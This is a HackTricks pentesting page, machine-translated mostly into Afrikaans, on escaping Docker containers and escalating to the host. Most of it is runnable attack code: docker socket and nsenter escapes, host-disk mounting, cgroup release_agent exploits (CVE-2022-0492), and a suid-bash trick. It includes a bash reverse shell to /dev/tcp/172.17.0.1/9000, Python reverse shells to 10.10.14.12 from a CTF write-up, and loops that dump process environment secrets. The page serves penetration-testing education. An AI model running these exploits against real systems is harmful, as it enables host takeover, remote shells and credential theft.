# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Outomatiese Enumerasie & Ontsnapping

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **hou van houers**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie hulpmiddel is redelik **nuttig om die houer waarin jy is te hou, selfs om outomaties te probeer ontsnap**
- [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige hulpmiddel om die regte wat die houer het te kry om maniere te vind om daarvan te ontsnap
- [**deepce**](https://github.com/stealthcopter/deepce): Hulpmiddel om te hou en van houers te ontsnap
- [**grype**](https://github.com/anchore/grype): Kry die CVEs wat in die sagteware geïnstalleer in die beeld is

## Gemonteerde Docker Socket Ontsnapping

As jy op een of ander manier vind dat die **docker socket gemonteer is** binne die docker houer, sal jy in staat wees om daarvan te ontsnap.\
Dit gebeur gewoonlik in docker houers wat om een of ander rede met die docker daemon moet verbind om aksies uit te voer.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
In hierdie geval kan jy gewone docker-opdragte gebruik om met die docker daemon te kommunikeer:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> In geval die **docker socket in 'n onverwagte plek is** kan jy steeds met dit kommunikeer deur die **`docker`** opdrag met die parameter **`-H unix:///path/to/docker.sock`** te gebruik.

Docker daemon mag ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kommunikasie met die Docker daemon kan plaasvind oor die Systemd socket `fd://`.

> [!NOTE]
> Boonop, let op die runtime sockets van ander hoëvlak runtimes:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Vermoedens van Misbruik van Vermoëns

Jy moet die vermoëns van die houer nagaan, as dit enige van die volgende het, mag jy in staat wees om daaruit te ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Jy kan tans die houervermoëns nagaan met **voorheen genoemde outomatiese gereedskap** of:
```bash
capsh --print
```
Op die volgende bladsy kan jy **meer leer oor linux vermoëns** en hoe om dit te misbruik om te ontsnap/te eskaleer bevoegdhede:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Ontsnap uit Bevoegde Houers

'n Bevoegde houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigingstelsels te deaktiveer:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Die `--privileged` vlag verlaag die sekuriteit van die houer aansienlik, wat **onbeperkte toesteltoegang** bied en **verskeie beskermings** omseil. Vir 'n gedetailleerde ontleding, verwys na die dokumentasie oor die volle impakte van `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Bevoegd + hostPID

Met hierdie toestemmings kan jy net **na die naamruimte van 'n proses wat in die gasheer as root loop, beweeg** soos init (pid:1) deur net te run: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Toets dit in 'n houer wat uitvoer:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Bevoorreg

Net met die bevoorregte vlag kan jy probeer om die **gasheer se skyf** te **benader** of probeer om te **ontsnap deur gebruik te maak van release_agent of ander ontsnapmetodes**.

Toets die volgende omseilings in 'n houer wat uitvoer:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montering Skyf - Poc1

Goed geconfigureerde docker houers sal nie opdragte soos **fdisk -l** toelaat nie. egter op verkeerd geconfigureerde docker opdragte waar die vlag `--privileged` of `--device=/dev/sda1` met hoofletters gespesifiseer is, is dit moontlik om die bevoegdhede te verkry om die gasheer skyf te sien.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

So om die gasheer masjien oor te neem, is dit triviaal:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
En voilà ! U kan nou toegang tot die lêerstelsel van die gasheer verkry omdat dit in die `/mnt/hola` gids gemonteer is.

#### Montering van Skyf - Poc2

Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer OS te verkry via 'n skryfbare hostPath volume wat deur die kluster geskep is. Hieronder is 'n paar algemene dinge wat u binne die houer kan nagaan om te sien of u hierdie aanvallersvektor kan benut:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privilege Escape Misbruik van bestaande release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Bevoorregte Ontsnapping Misbruik van geskepte release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Vind 'n **verklaring van die tegniek** in:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Bevoorregte Ontsnapping Misbruik van release_agent sonder om die relatiewe pad te ken - PoC3

In die vorige eksploitte is die **absolute pad van die houer binne die gasheer se lêerstelsel bekend gemaak**. Dit is egter nie altyd die geval nie. In gevalle waar jy **nie die absolute pad van die houer binne die gasheer ken nie**, kan jy hierdie tegniek gebruik:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Die uitvoering van die PoC binne 'n bevoorregte houer behoort 'n uitvoer te verskaf wat soortgelyk is aan:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Privilege Escape Misbruik van Sensitiewe Monte

Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer** gee. Sommige daarvan kan selfs aandui **iets wat deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller sal toelaat om uit die houer te ontsnap).\
Die misbruik van hierdie lêers kan toelaat dat:

- release_agent (alreeds voorheen behandel)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

U kan egter **ander sensitiewe lêers** vind om na te kyk op hierdie bladsy:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Arbitraire Monte

In verskeie gevalle sal u vind dat die **houer 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek gekonfigureer is nie, mag u in staat wees om **sensitiewe data te bekom/te wysig**: Lees geheime, verander ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation met 2 shells en host mount

As jy toegang het as **root binne 'n container** wat 'n paar vouers van die host gemonteer het en jy het **gevlug as 'n nie-bevoorregte gebruiker na die host** en het lees toegang oor die gemonteerde vouer.\
Jy kan 'n **bash suid-lêer** in die **gemonteerde vouer** binne die **container** skep en dit **van die host uitvoer** om privesc te verkry.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation met 2 shells

As jy toegang het as **root binne 'n houer** en jy het **gevlug as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide shells misbruik om **privesc binne die gasheer** te doen as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**in hierdie pos verduidelik**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Met so 'n vermoë mag die root gebruiker binne die houer **blok toestel lêers skep**. Toestel lêers is spesiale lêers wat gebruik word om **toegang te verkry tot onderliggende hardeware & kernmodules**. Byvoorbeeld, die /dev/sda blok toestel lêer gee toegang om **die rou data op die stelseldisk te lees**.

Docker beskerm teen blok toestel misbruik binne houers deur 'n cgroup beleid af te dwing wat **blok toestel lees/skryf operasies blokkeer**. Nietemin, as 'n blok toestel **binne die houer geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/** gids. Hierdie toegang vereis dat die **proses eienaar dieselfde moet wees** binne en buite die houer.

**Eksploitering** voorbeeld van hierdie [**skrywe**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

As jy toegang kan verkry tot die prosesse van die gasheer, sal jy in staat wees om 'n baie sensitiewe inligting wat in daardie prosesse gestoor is, te bekom. Voer toetslaboratorium uit:
```
docker run --rm -it --pid=host ubuntu bash
```
Byvoorbeeld, jy sal in staat wees om die prosesse te lys met iets soos `ps auxn` en soek na sensitiewe besonderhede in die opdragte.

Dan, aangesien jy **elke proses van die gasheer in /proc/ kan toegang verkry, kan jy net hul omgewingsecrets steel** deur te loop:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Jy kan ook **ander prosesse se lêerdeskriptoren toegang en hul oop lêers lees**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Jy kan ook **prosesse doodmaak en 'n DoS veroorsaak**.

> [!WARNING]
> As jy op een of ander manier bevoorregte **toegang oor 'n proses buite die houer** het, kan jy iets soos `nsenter --target <pid> --all` of `nsenter --target <pid> --mount --net --pid --cgroup` uitvoer om **'n skulp met dieselfde ns-beperkings** (hopelik geen) **as daardie proses te loop.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
As 'n houer met die Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/) gekonfigureer is, is daardie houer se netwerkstapel nie van die Docker-gasheer geïsoleer nie (die houer deel die gasheer se netwerknaamruimte), en die houer ontvang nie sy eie IP-adres nie. Met ander woorde, die **houer bind al die dienste direk aan die gasheer se IP**. Verder kan die houer **ALLES netwerkverkeer wat die gasheer** stuur en ontvang op die gedeelde koppelvlak `tcpdump -i eth0` onderskep.

Byvoorbeeld, jy kan dit gebruik om **verkeer te snuffel en selfs te spoof** tussen die gasheer en metadata-instantie.

Soos in die volgende voorbeelde:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Jy sal ook in staat wees om toegang te verkry tot **netwerkdienste wat aan localhost gebind is** binne die gasheer of selfs toegang te verkry tot die **metadata-toestemmings van die node** (wat dalk anders kan wees as wat 'n houer kan toegang). 

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Met `hostIPC=true` kry jy toegang tot die gasheer se inter-proses kommunikasie (IPC) hulpbronne, soos **gedeelde geheue** in `/dev/shm`. Dit stel jou in staat om te lees/schryf waar dieselfde IPC hulpbronne deur ander gasheer of pod prosesse gebruik word. Gebruik `ipcs` om hierdie IPC meganismes verder te ondersoek.

- **Ondersoek /dev/shm** - Soek enige lêers in hierdie gedeelde geheue ligging: `ls -la /dev/shm`
- **Ondersoek bestaande IPC fasiliteite** – Jy kan kyk of enige IPC fasiliteite gebruik word met `/usr/bin/ipcs`. Kontroleer dit met: `ipcs -a`

### Herwin vermoëns

As die syscall **`unshare`** nie verbied is nie, kan jy al die vermoëns herwin wat loop:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Gebruik van gebruikersnaamruimte via symlink

Die tweede tegniek wat in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) verduidelik word, dui aan hoe jy bind mounts met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).

## CVEs

### Runc exploit (CVE-2019-5736)

In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), probeer om voorregte te verhoog deur uit 'n houer te ontsnap deur CVE-2019-5736 te misbruik (exploit [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre van die **gasheer** **uit 'n houer** **oorskryf**, sodat enigeen wat docker exec uitvoer, die payload kan aktiveer.

Verander die payload dienooreenkomstig en bou die main.go met `go build main.go`. Die resulterende binêre moet in die docker houer geplaas word vir uitvoering.\
By uitvoering, sodra dit `[+] Oorskrywe /bin/sh suksesvol` vertoon, moet jy die volgende vanaf die gasheer masjien uitvoer:

`docker exec -it <container-name> /bin/sh`

Dit sal die payload aktiveer wat in die main.go-lêer teenwoordig is.

Vir meer inligting: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Daar is ander CVEs waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Aangepaste Ontsnapping

### Docker Ontsnappingsoppervlak

- **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** deur middel van naamruimtes, sodat ons nie kan ontsnap deur met ander procs te kommunikeer nie (per standaard kan nie kommunikeer via IPCs, unix sockets, netwerk svcs, D-Bus, `/proc` van ander procs).
- **Root gebruiker**: Per standaard is die gebruiker wat die proses uitvoer die root gebruiker (maar sy voorregte is beperk).
- **Vermogens**: Docker laat die volgende vermogens oor: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Dit is die syscalls wat die **root gebruiker nie kan aanroep nie** (as gevolg van ontbrekende vermogens + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
